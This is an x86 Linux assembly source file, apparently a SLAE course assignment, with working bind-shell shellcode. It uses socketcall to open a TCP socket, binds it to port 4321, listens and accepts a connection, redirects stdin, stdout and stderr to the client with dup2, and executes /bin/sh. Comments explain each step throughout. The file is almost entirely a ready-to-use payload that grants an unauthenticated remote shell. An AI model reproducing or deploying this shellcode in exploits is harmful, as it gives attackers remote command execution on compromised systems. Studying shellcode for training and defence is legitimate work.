;
; Author 	: Rizal Muhammed (UB3RSiCK)
; Description	: SLAE x86 Assignment 1 - Shell Bind TCP Shellcode (Linux/x86)
; File 		: shell-bind-tcp-x86.nasm
; Website	: https://ub3rsick.github.io/

global _start

section .text

	_start:
		; int socketcall(int call, unsigned long *args)
		; int socket(int domain, int type, int protocol); 
		; sockfd = socket(2, 1, 0)

		; EAX = 0x66 			; sys_socketcall()
		; EBX = 0x1			; sys_socket()
		; ECX = Pointer to sys_socket arguments

		xor eax, eax
		push eax			; Argument 3 for socket() =>  	IPPROTO_IP = 0
		mov al, 0x66
		
		;xor ebx, ebx
		;mov bl, 0x1
		
		push byte 0x1			; Argument 2 for socket() => 	SOCK_STREAM = 1	
		pop ebx
		push byte 0x1
		
		push byte 0x2			; Argument 1 for socket() => 	AF_INET	= 2	
		
		; Now we have arguments for socket() in the stack. ESP points to them.
		
		mov ecx, esp
		int 0x80			; returns socket file descriptor to EAX

		;********************************************************************************;

		; Binding socket to port.		
		; Now that we have a socket, we need to bind it to a port.
		;	
		; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);	

		; EAX = 0x66 = sys_socketcall()
		; EBX = 0x2  = sys_bind()
		; ECX = pointer to arguments of sys_bind

		; EAX has the socketfd, we need to save it somewhere for later use.

		pop ebx			; EBX = 2
		pop esi			; Clears ESI also the stack now has our required value for sin_addr = 0

			; sin_addr = 0; will now be on stack from earlier push
			;#define INADDR_ANY ((unsigned long int) 0x00000000) ;
		
		xchg esi, eax			; sockfd is now in esi
		
		mov al, 0x66
		push word 0xe110		; push sin_port = hex(htons(4321))
		push word bx			; push sin_family = AF_INET = 2
		
		; now stack has (from top) -> [2, 0xe110, 0]
		; ESP points to this structure
		; save it in ECX
		
		mov ecx, esp
		
		push 0x10			; addrlen = 16
		push ecx			; pointer to sockaddr
		push esi			; sockfd

		mov ecx, esp			; Pointer to bind args

		int 0x80
		
		;********************************************************************************;

		; listen to the port
		; int listen(int sockfd, int backlog);

		; EAX = 0x66 	; sys_socketcall()
		; EBX = 0x4	; sys_listen()
		; ECX = pointer to args of sys_listen

		mov al, 0x66
		mov bl, 0x4
		
		xor edi, edi
		push edi		; backlog = 0
		
		push esi		; ESI still has our socketfd
		mov ecx, esp

		int 0x80

		;********************************************************************************;
		; Accept connections with sys_accept
		
		; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
		; we dont want any information regarding the client. So, from the man page of accept : 
		; When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL.
		
		; EAX = 0x66		; sys_socketcall()
		; EBX = 0x5		; sys_accept()
		; ECX = Pointer to args of sys_accept()


		mov al, 0x66
		inc ebx
		
		push edi		; addrlen = EDI = 0
		push edi		; addr	  = EDI = 0
		push esi		; ESI has our sockfd
		mov ecx, esp
		
		int 0x80

	
		;********************************************************************************;
		; Redirect srdin, stdout, stderr with sys_dup2
		; int dup2(int oldfd, int newfd);
		; sys_dup2 = 0x3f

		;EAX 	= 0x3f
	        ;EBX	= oldfd	= clientfd
       		;ECX	= newfd	= 0, 1, 2

		xchg ebx,eax		; save the clientfd in ebx
		
	        xor eax, eax
		xor ecx, ecx
		mov cl,0x2

		dup_loop:
			mov al, 0x3f		; sys_dup2()
			int 0x80
			dec ecx			; 2, 1, 0
			jns dup_loop		; loop until SF is set

		;********************************************************************************;
		; execve /bin/sh
		
		; EAX	= 0xb		; sys_execve()
	        ; EBX	= pointer to /bin/sh null terminated
       		; ECX	= pointer to address of /bin/sh null terminated
		; EDX	= pointer to an empty array
		
		xor eax, eax
		push eax				; push first 4 null bytes onto stack
			

		; //bin/sh (8)
		push 0x68732f2f
		push 0x6e69622f
							; stack contents from top - //bin/sh 0x00000000
		mov ebx, esp				; EBX has address of //bin/sh null terminated

		push eax				; push another 4 null bytes
        						; stack contents from top - 0x00000000 //bin/sh 0x00000000
        
		mov edx, esp				; now EDX has the address of the 4 null bytes that we just pushed
        
		push ebx				; stack contents from top
        						; addr_of_/bin/sh 0x00000000 //bin/sh 0x00000000

		mov ecx, esp

		mov al, 0xb
		int 0x80
